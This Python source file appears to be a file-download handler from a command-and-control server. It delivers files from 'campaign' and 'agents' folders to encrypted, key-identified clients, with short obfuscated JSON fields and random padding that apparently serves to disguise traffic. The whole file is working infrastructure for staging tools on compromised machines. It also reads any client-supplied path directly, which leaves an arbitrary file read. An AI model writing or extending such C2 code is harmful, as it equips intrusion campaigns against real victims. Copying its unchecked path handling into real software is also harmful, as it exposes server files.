import os
import base64
import json
import logging
import random
import string
import datetime
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class FileDownloadHandler(BaseHandler):
    """Handler for file download requests from clients"""
    
    def handle(self):
        """Process file download request from client (server sends, client downloads)"""
        # Log the specific path being used for debugging
        self.log_message(f"File download request received on path: {self.request_handler.path}")
        
        # Get content data
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error_response(400, "Missing content")
            return
            
        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse the JSON request
            request_json = json.loads(request_body)
            encrypted_data = request_json.get('d') or request_json.get('data')
            
            # Extract token padding (if present - discard it since we don't need it)
            token = request_json.get('t', '') or request_json.get('token', '')
            if token:
                self.log_message(f"Received file download request with {len(token)} bytes of token padding")
                
            # Verify presence of encrypted data
            if not encrypted_data:
                self.send_error_response(400, "Missing encrypted data field")
                return
            
            # Identify client by key-based decryption
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            # If client identification failed but client_id was provided in request
            if client_id is None:
                provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
                
                if provided_client_id:
                    # Try decryption using the provided client ID
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
                        client_id = provided_client_id
                    except Exception as e:
                        logger.error(f"Failed to decrypt using provided client ID: {e}")
            
            if client_id is None or decrypted_data is None:
                self.send_error_response(400, "Authentication failed - could not decrypt data")
                return
                
            # Process the file request
            response = self._process_file_request(client_id, decrypted_data)
            
            # Encrypt the response
            response_json = json.dumps(response)
            encrypted_response = self.crypto_helper.encrypt(response_json, client_id)
            
            # Add token padding to the response
            token_padding = self._generate_token_padding()
            
            # Send the encrypted response with token padding using standardized format
            self.send_response(200, "application/json", json.dumps({
                "d": encrypted_response,  # Shortened from "data"
                "t": token_padding        # Shortened from "token"
            }))
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error: {e} - Request body: {request_body[:100]}...")
            self.send_error_response(400, f"Invalid JSON format: {str(e)}")
        except Exception as e:
            logger.error(f"Error handling file download request: {e}")
            
            # Send structured error response
            error_response = {
                "Status": "Error",
                "Message": str(e)
            }
            
            try:
                if 'client_id' in locals() and client_id:
                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
                    token_padding = self._generate_token_padding()
                    self.send_response(200, "application/json", json.dumps({
                        "d": encrypted_error,  # Shortened from "data"
                        "t": token_padding     # Shortened from "token"
                    }))
                else:
                    self.send_error_response(500, "Server Error")
            except Exception as e2:
                logger.error(f"Error sending error response: {e2}")
                self.send_error_response(500, "Server Error")
    
    def _generate_token_padding(self):
        """Generate random token padding for responses"""
        # Generate a random length between 50 and 500 characters
        padding_length = random.randint(50, 500)
        
        # Generate random padding content
        chars = string.ascii_letters + string.digits
        padding = ''.join(random.choice(chars) for _ in range(padding_length))
        
        return padding
    
    def _identify_client_by_ip(self):
        """Identify client based on IP address as fallback"""
        client_ip = self.client_address[0]
        for client_id, client_info in self.client_manager.get_clients_info().items():
            if client_info.get('ip') == client_ip:
                return client_id
        return None
            
    def _process_file_request(self, client_id, file_request_json):
        """
        Process a client's request to download a file from the server
        
        Args:
            client_id: The client ID
            file_request_json: JSON string containing the file request information
            
        Returns:
            Dictionary with file response information
        """
        try:
            # Parse the file request with proper error handling
            if isinstance(file_request_json, str):
                try:
                    file_request = json.loads(file_request_json)
                except json.JSONDecodeError as e:
                    self.log_message(f"Error parsing JSON request: {e}, content: {file_request_json[:100]}...")
                    return {
                        "Status": "Error",
                        "Message": f"Invalid JSON format: {str(e)}"
                    }
            else:
                # Already parsed JSON
                file_request = file_request_json
            
            file_path = file_request.get('FilePath')
            destination = file_request.get('Destination')
            
            if not file_path:
                return {
                    "Status": "Error",
                    "Message": "No file path specified"
                }
            
            # Log the request
            self.log_message(f"File request from client {client_id or self.client_address[0]}: {file_path}")
            if client_id:
                self.client_manager.log_event(client_id, "File Request", f"Client requested server file: {file_path}")
            
            # Determine the file path in the campaign folders
            campaign_folder = self.get_campaign_folder()
            downloads_folder = os.path.join(campaign_folder, "downloads")
            uploads_folder = os.path.join(campaign_folder, "uploads")
            
            # Look for the file in several possible locations
            possible_locations = [
                file_path,  # Direct path
                os.path.join(downloads_folder, file_path),  # In downloads folder
                os.path.join(uploads_folder, file_path),  # In uploads folder
                os.path.join(campaign_folder, file_path),  # In campaign folder
                os.path.join(campaign_folder, "agents", file_path)  # In agents folder
            ]
            
            # If client_id is available, also check in client-specific upload/download folders
            if client_id:
                possible_locations.append(os.path.join(uploads_folder, client_id, file_path))
                possible_locations.append(os.path.join(downloads_folder, client_id, file_path))
                
                # Try with just the filename in the client folders
                filename = os.path.basename(file_path)
                possible_locations.append(os.path.join(uploads_folder, client_id, filename))
                possible_locations.append(os.path.join(downloads_folder, client_id, filename))
                possible_locations.append(os.path.join(campaign_folder, "agents", filename))
            
            # Try each location
            actual_path = None
            for path in possible_locations:
                self.log_message(f"Checking path: {path}")
                if os.path.exists(path) and os.path.isfile(path):
                    actual_path = path
                    self.log_message(f"File found at: {path}")
                    break
            
            if not actual_path:
                self.log_message(f"File not found in any of {len(possible_locations)} possible locations")
                return {
                    "Status": "Error", 
                    "Message": f"File not found: {file_path}"
                }
            
            # Read the file content as bytes and encode as Base64
            with open(actual_path, 'rb') as f:
                file_content = f.read()
            
            file_size = len(file_content)
            file_content_base64 = base64.b64encode(file_content).decode('utf-8')
            
            # Save a copy of the sent file to the uploads folder (server perspective)
            self._record_file_sent_to_client(client_id, actual_path, file_content, destination)
            
            # Log the successful file transmission
            self.log_message(f"File {actual_path} ({file_size} bytes) sent to client {client_id or self.client_address[0]}")
            if client_id:
                self.client_manager.log_event(client_id, "File Sent", f"Server file {actual_path} ({file_size} bytes) sent to client")
            
            # Create and return the response
            return {
                "Status": "Success",
                "FileName": os.path.basename(actual_path),
                "FileSize": file_size,
                "FileContent": file_content_base64
            }
            
        except json.JSONDecodeError as e:
            logger.error(f"Error parsing JSON in file request: {e}")
            return {
                "Status": "Error",
                "Message": f"Invalid file request format: {str(e)}"
            }
        except Exception as e:
            logger.error(f"Error processing file request: {e}")
            return {
                "Status": "Error",
                "Message": f"Error processing file request: {str(e)}"
            }

    def _record_file_sent_to_client(self, client_id, source_path, file_content, destination=None):
        """Record a copy of a file sent to client in the uploads folder"""
        if not client_id:
            return
            
        campaign_folder = self.get_campaign_folder()
        uploads_folder = os.path.join(campaign_folder, "uploads", client_id)
        os.makedirs(uploads_folder, exist_ok=True)
        
        # Create a filename that indicates this was sent to the client
        filename = f"sent_to_client_{os.path.basename(source_path)}"
        upload_path = os.path.join(uploads_folder, filename)
        
        try:
            # Save a copy of the file
            with open(upload_path, 'wb') as f:
                f.write(file_content)
                
            # Add a metadata file with additional information
            metadata_path = f"{upload_path}.meta"
            
            metadata = {
                "original_path": source_path,
                "client_destination": destination,
                "size_bytes": len(file_content),
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            with open(metadata_path, 'w') as f:
                json.dump(metadata, f, indent=2)
                
            self.log_message(f"Recorded file sent to client {client_id} at {upload_path}")
        except Exception as e:
            self.log_message(f"Warning: Could not record file sent to client: {e}")